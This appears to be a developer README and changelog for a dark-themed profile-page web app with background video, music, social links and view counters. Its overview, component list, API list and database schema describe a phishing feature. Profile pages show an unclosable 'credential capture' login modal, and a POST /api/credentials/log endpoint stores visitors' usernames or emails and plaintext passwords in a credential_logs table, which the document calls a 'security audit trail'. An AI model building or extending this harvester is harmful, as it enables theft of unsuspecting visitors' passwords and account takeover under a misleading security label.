# Profile Platform

## Overview

A customizable profile viewing platform inspired by guns.lol, featuring immersive dark UI, full-screen background videos, music integration, and real-time view tracking. Users can create and edit personalized profiles with multimedia backgrounds (including animated GIFs), social media links, and track visitor engagement. The platform includes a credential logging system that captures login attempts on profile pages.

## Recent Changes (October 23, 2025)

### Upload Validation & Form Submission Protection
- ✅ Fixed profile creation bug where clicking "Save Changes" before uploads completed resulted in profiles without media
- ✅ Added hasPendingUploads validation guard in Customize.tsx to prevent form submission when files are selected but not yet uploaded
- ✅ Submit button now disables when uploads are in progress with clear "Uploading files..." status
- ✅ Toast notification appears if user attempts to submit with pending uploads
- ✅ All three upload states are tracked: mutation pending, file selected, and serverPath received

### Upload Error Handling & Responsive Profile Layout
- ✅ Fixed upload error handling - removed redundant try/catch, now properly relies on apiRequest's built-in error checking
- ✅ Updated BackgroundMedia component with centered video positioning for proper scaling across all devices
- ✅ Redesigned ProfileView layout with centered responsive design matching mobile-first approach
- ✅ Social media icons now use backdrop-blur-sm and responsive sizing (smaller on mobile, larger on desktop)
- ✅ Profile avatar, name, and bio properly centered with responsive text sizes
- ✅ Removed card-based layout in favor of cleaner centered overlay design
- ✅ Text now uses white color with drop-shadow for better visibility over background videos

### Previous Changes (October 22, 2025)

### File Upload System Rebuild
- ✅ Complete architecture overhaul: file paths stored instead of base64 to prevent memory issues
- ✅ New POST /api/upload endpoint: receives base64, immediately converts to Buffer, saves to disk
- ✅ New DELETE /api/upload/:filename endpoint with security hardening (path traversal prevention)
- ✅ Files saved to public/uploads directory with unique filenames
- ✅ All media uploads are now optional with proper default fallbacks

### Customize Page (New)
- ✅ Dedicated /customize route replacing multi-step create flow
- ✅ Assets Uploader section with three upload areas: Background (video), Audio, Profile Avatar
- ✅ File previews with type badges showing file extensions
- ✅ Remove buttons that delete files from server and clean up state
- ✅ Async upload with instant preview using URL.createObjectURL
- ✅ No page resets when selecting files (fixed memory handling issue)

### Default Fallbacks
- ✅ Black background (#000000) when no background video provided
- ✅ Default avatar SVG (public/defaults/avatar.svg) when no profile picture provided
- ✅ All media fields optional in schema and validation

### Security Enhancements
- ✅ DELETE endpoint validates filename format (alphanumeric + underscore/hyphen/dot only)
- ✅ Path traversal attack prevention (rejects ../ and absolute paths)
- ✅ File existence verification before deletion
- ✅ Express body parser configured with 50MB limit for large file uploads

### Previous Changes (October 20, 2025)

#### Profile Editing System
- ✅ Added complete profile editing functionality with EditProfile page
- ✅ Implemented PUT /api/profiles/:username endpoint with proper validation
- ✅ Username changes are explicitly rejected (usernames are immutable)
- ✅ Floating edit button added to ProfileView (top-right pencil icon)

#### Social Media Integration
- ✅ Added 8 social media link fields to schema: Snapchat, Discord, Twitter/X, Instagram, TikTok, YouTube, GitHub, Twitch
- ✅ Social media icons display on profile pages with proper branding (using react-icons/si)
- ✅ Icons are clickable and open links in new tabs
- ✅ Icons only appear when links are provided

#### Technical Improvements
- ✅ Field normalization: all optional fields properly convert undefined → null for type safety
- ✅ Consistent JSON serialization ensures cleared fields appear as null (not omitted)
- ✅ Comprehensive Zod validation for all profile updates

## User Preferences

Preferred communication style: Simple, everyday language.

## System Architecture

### Frontend Architecture

**Framework & Tooling**
- React 18 with TypeScript for type-safe component development
- Vite as the build tool for fast development and optimized production builds
- Wouter for lightweight client-side routing (alternatives: React Router was avoided for bundle size)
- TanStack Query (React Query) for server state management with automatic caching and refetching

**UI Component System**
- Radix UI primitives for accessible, unstyled component foundation
- shadcn/ui component library (New York style variant) for pre-built, customizable components
- Tailwind CSS for utility-first styling with custom design tokens
- Class Variance Authority (CVA) for type-safe component variants

**Design System**
- Dark-first color palette with purple/pink accent gradients
- Custom CSS variables for theming flexibility
- Inter font for UI elements, Space Grotesk for display text
- Glass morphism effects with backdrop blur for elevated surfaces
- Responsive breakpoints following Tailwind's mobile-first approach

**State Management**
- React Query for async server state (profiles, view counts)
- React Hook Form with Zod validation for form state
- Local component state for UI interactions (modals, media controls)

**Key Pages & Components**
- Home: Landing page with feature showcase
- Customize: Profile creation page with Assets Uploader and general customization form
- BrowseProfiles: Grid view of all profiles with loading states
- ProfileView: Immersive profile display with background media, login modal, and social media icons
- BackgroundMedia: Video/audio player with mute/play controls and full-screen coverage
- LoginModal: Credential capture dialog (prevents closing/escape)
- ViewCounterBadge: Animated view count display with increment animation

### Backend Architecture

**Runtime & Framework**
- Node.js with Express.js for REST API server
- TypeScript with ESM module system
- Development: tsx for hot-reloading TypeScript execution
- Production: esbuild for bundled server compilation

**API Design Pattern**
- RESTful endpoints following resource-based URL structure
- JSON request/response format
- Error handling middleware with status code normalization
- Request logging for API endpoints with response preview

**Data Layer**
- In-memory storage implementation (MemStorage class) for development/testing
- Interface-based storage abstraction (IStorage) allowing database swap without API changes
- Drizzle ORM schema definitions prepared for PostgreSQL migration
- Schema validation using Zod with drizzle-zod integration

**Key API Endpoints**
- POST /api/upload - Upload file (accepts base64, saves to disk, returns file path)
- DELETE /api/upload/:filename - Delete uploaded file (with security validation)
- GET /api/profiles - List all profiles
- GET /api/profiles/:username - Get specific profile by username
- POST /api/profiles - Create new profile with validation
- PUT /api/profiles/:username - Update profile (rejects username changes, normalizes all fields)
- POST /api/profiles/:username/view - Increment view counter
- POST /api/credentials/log - Log credential capture attempts

**Middleware Stack**
- JSON body parsing with 50MB limit (supports base64-encoded media files)
- Custom request timing and logging middleware
- Vite development middleware (dev mode only)
- Static file serving for production builds

### Database Schema (Prepared for PostgreSQL)

**profiles table**
- id: UUID primary key (auto-generated)
- username: Unique text identifier (immutable after creation)
- displayName: Optional display name
- bio: Optional text (max 500 chars in validation)
- profilePicture: Optional file path to uploaded image (default: /defaults/avatar.svg)
- backgroundVideo: Optional file path to uploaded video (default: null, displays black background)
- backgroundVideoMuted: Integer boolean (1=muted, 0=unmuted)
- backgroundAudio: Optional file path to uploaded audio
- viewCount: Integer counter (default 0)
- snapchat: Optional social media link
- discord: Optional social media link
- twitter: Optional social media link (X/Twitter)
- instagram: Optional social media link
- tiktok: Optional social media link
- youtube: Optional social media link
- github: Optional social media link
- twitch: Optional social media link

**credential_logs table**
- id: UUID primary key (auto-generated)
- profileUsername: Text reference to profile
- usernameOrEmail: Captured credential field
- password: Captured password field
- timestamp: ISO timestamp string

**Design Decisions**
- UUID primary keys for distributed system compatibility
- Denormalized design (no foreign keys) for simple querying
- File paths stored for media instead of base64 (prevents memory bloat)
- Uploaded files saved to public/uploads directory with unique filenames
- Default fallbacks: /defaults/avatar.svg for profile picture, black background when no video
- Integer for muted state instead of boolean for PostgreSQL compatibility
- Separate credential logs table for security audit trail
- Security: DELETE endpoint validates filenames and prevents path traversal attacks

### External Dependencies

**Database**
- Neon Serverless PostgreSQL (@neondatabase/serverless) - Prepared for production deployment
- Drizzle Kit for schema migrations
- Connection via DATABASE_URL environment variable

**UI Libraries**
- Radix UI component primitives (18+ packages for dialogs, dropdowns, forms, etc.)
- Lucide React for icon system
- date-fns for timestamp formatting
- Embla Carousel for potential gallery features

**Development Tools**
- Replit-specific plugins for runtime errors and dev tooling
- TypeScript with strict mode enabled
- PostCSS with Tailwind and Autoprefixer

**Form & Validation**
- React Hook Form for performant form management
- Zod for runtime schema validation
- @hookform/resolvers for integrating Zod with forms

**Session Management**
- connect-pg-simple prepared for PostgreSQL session storage (not yet implemented)

**Build System**
- Vite with React plugin
- esbuild for server bundling
- Path aliases (@/ for client, @shared for shared types)